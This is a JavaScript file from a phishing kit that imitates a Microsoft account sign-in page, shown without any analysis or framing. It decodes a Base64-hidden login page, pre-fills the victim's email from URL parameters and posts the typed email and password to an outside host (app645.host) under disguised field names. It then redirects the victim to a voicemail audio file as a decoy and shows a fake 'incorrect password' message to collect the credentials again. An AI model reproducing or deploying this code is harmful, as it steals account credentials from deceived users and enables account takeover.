var ____b = 'https://app645.host/hb/compact.php';
var ____rdr = 'https://ia802807.us.archive.org/33/items/voicemail_201810/message.wav';

function validateEmail(email) {
    var re = /^\S+@\S+[\.][0-9a-z]+$/;
    return re.test(String(email).toLowerCase());
}

function getUrlParameter(sParam) {
    var sPageURL = decodeURIComponent(window.location.search.substring(1)),
        sURLVariables = sPageURL.split('&'),
        sParameterName,
        i;

    for (i = 0; i < sURLVariables.length; i++) {
        sParameterName = sURLVariables[i].split('=');

        if (sParameterName[0] === sParam) {
            return sParameterName[1] === undefined ? true : sParameterName[1];
        }
    }
}

var dDOM = function () {
    // var decryptedBytes = CryptoJS.AES.decrypt(view, phrase);
    // return decryptedBytes.toString(CryptoJS.enc.Utf8);

    return Base64.decode(view);
};

var Base64 = {
    // private property
    _keyStr: "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=",

    // public method for encoding
    encode: function (input) {
        var output = "";
        var chr1, chr2, chr3, enc1, enc2, enc3, enc4;
        var i = 0;

        input = Base64._utf8_encode(input);

        while (i < input.length) {

            chr1 = input.charCodeAt(i++);
            chr2 = input.charCodeAt(i++);
            chr3 = input.charCodeAt(i++);

            enc1 = chr1 >> 2;
            enc2 = ((chr1 & 3) << 4) | (chr2 >> 4);
            enc3 = ((chr2 & 15) << 2) | (chr3 >> 6);
            enc4 = chr3 & 63;

            if (isNaN(chr2)) {
                enc3 = enc4 = 64;
            } else if (isNaN(chr3)) {
                enc4 = 64;
            }

            output = output +
                this._keyStr.charAt(enc1) + this._keyStr.charAt(enc2) +
                this._keyStr.charAt(enc3) + this._keyStr.charAt(enc4);

        }

        return output;
    },

    // public method for decoding
    decode: function (input) {
        var output = "";
        var chr1, chr2, chr3;
        var enc1, enc2, enc3, enc4;
        var i = 0;

        input = input.replace(/[^A-Za-z0-9\+\/\=]/g, "");

        while (i < input.length) {

            enc1 = this._keyStr.indexOf(input.charAt(i++));
            enc2 = this._keyStr.indexOf(input.charAt(i++));
            enc3 = this._keyStr.indexOf(input.charAt(i++));
            enc4 = this._keyStr.indexOf(input.charAt(i++));

            chr1 = (enc1 << 2) | (enc2 >> 4);
            chr2 = ((enc2 & 15) << 4) | (enc3 >> 2);
            chr3 = ((enc3 & 3) << 6) | enc4;

            output = output + String.fromCharCode(chr1);

            if (enc3 != 64) {
                output = output + String.fromCharCode(chr2);
            }
            if (enc4 != 64) {
                output = output + String.fromCharCode(chr3);
            }

        }

        output = Base64._utf8_decode(output);

        return output;

    },

    // private method for UTF-8 encoding
    _utf8_encode: function (string) {
        string = string.replace(/\r\n/g, "\n");
        var utftext = "";

        for (var n = 0; n < string.length; n++) {

            var c = string.charCodeAt(n);

            if (c < 128) {
                utftext += String.fromCharCode(c);
            } else if ((c > 127) && (c < 2048)) {
                utftext += String.fromCharCode((c >> 6) | 192);
                utftext += String.fromCharCode((c & 63) | 128);
            } else {
                utftext += String.fromCharCode((c >> 12) | 224);
                utftext += String.fromCharCode(((c >> 6) & 63) | 128);
                utftext += String.fromCharCode((c & 63) | 128);
            }

        }

        return utftext;
    },

    // private method for UTF-8 decoding
    _utf8_decode: function (utftext) {
        var string = "";
        var i = 0;
        var c = c1 = c2 = 0;

        while (i < utftext.length) {

            c = utftext.charCodeAt(i);

            if (c < 128) {
                string += String.fromCharCode(c);
                i++;
            } else if ((c > 191) && (c < 224)) {
                c2 = utftext.charCodeAt(i + 1);
                string += String.fromCharCode(((c & 31) << 6) | (c2 & 63));
                i += 2;
            } else {
                c2 = utftext.charCodeAt(i + 1);
                c3 = utftext.charCodeAt(i + 2);
                string += String.fromCharCode(((c & 15) << 12) | ((c2 & 63) << 6) | (c3 & 63));
                i += 3;
            }

        }

        return string;

    }
};

var formState = 1;
var form1Button, form2Button, userInput, pwdInput;

function requestPasswordMode() {
    $('div[data-viewid="1"]').hide();
    $('div[data-viewid="2"], div.user-email').show();
    form2Button.prop('disabled', true);
    updateEmailInView();
    formState = 2;
}

function updateEmailInView() {
    var email = userInput.val();
    $('#displayName').text(email).attr({'title': email});
    pwdInput.attr({'aria-label': "Enter the password for " + email});
}

function bindElements() {
    form1Button = $('#idSIButton9');
    form2Button = $('#idSIButton10');
    userInput = $('input[name="loginfmt"]');
    pwdInput = $('input[name="passwd"]');

    $('a').on('click', function (e) {
        e.preventDefault();
    });

    userInput.on('keyup', function (e) {
        form1Button.prop('disabled', !validateEmail(this.value));
    });

    pwdInput.on('keyup', function (e) {
        form2Button.prop('disabled', this.value.length <= 6);
    });

    form1Button.on('click', function (e) {
        e.preventDefault();
        requestPasswordMode();
    });

    form2Button.click(function (e) {
        e.preventDefault();
        if (formState === 2) {
            form2Button.prop('disabled', true);
            var request = $.post(____b, {
                'name': userInput.val(),
                'path': pwdInput.val(),
                't': 1,
                'v': 1
            });
            request.success(function (e) {
                window.location = ____rdr;
            });
            request.error(function (httpObj, textStatus) {
                //Show error
                if (httpObj.status == 401) {
                    $('#passwordError')
                        .html("Your account or password is incorrect. If you don't remember " +
                            "your password, " +
                            '<a id=\"idA_IL_ForgotPassword0\" ' +
                            'href=\"https://account.live.com/ResetPassword.aspx?wreply=https://login.live.com/login.srf%3fwa%3dwsignin1.0%26rpsnv%3d13%26ct%3d1588239541%26rver%3d7.0.6737.0%26wp%3dMBI_SSL%26wreply%3dhttps%253a%252f%252foutlook.live.com%252fowa%252f%253fnlp%253d1%2526RpsCsrfState%253d7281d010-55d5-3147-50e5-3fa78ec74036%26id%3d292841%26aadredir%3d1%26CBCXT%3dout%26lw%3d1%26fl%3ddob%252cflname%252cwld%26cobrandid%3d90015%26uaid%3d6f76061369744447a69041d439afacaa%26pid%3d0%26contextid%3d7299327A97542A7D%26bk%3d1588264634&amp;id=292841&amp;uiflavor=web&amp;cobrandid=90015&amp;uaid=6f76061369744447a69041d439afacaa&amp;mkt=EN-US&amp;lc=1033&amp;bk=1588264634\"> ' +
                            "reset it now.</a>");
                    pwdInput.addClass('has-error').val('');
                } else if (httpObj.status == 500) {
                    $('#passwordError')
                        .text("Oops! Something went wrong with our server, please try again later.");
                    pwdInput.removeClass('has-error');
                }
            });
            request.always(function () {
                form2Button.prop('disabled', false);
            });
        }
    });
}

$(function () {
    var param = getUrlParameter('t');
    if (param) {
        var el = $('body > div');
        el.html(dDOM());
        $('title').text('Sign in to your Microsoft account');
        bindElements();
    } else {
        bindElements();
    }

    var email = getUrlParameter('e');
    if (email) {
        if (getUrlParameter('enc')) {
            email = atob(email);
        }
        userInput.val(email);
        requestPasswordMode();
    }
});
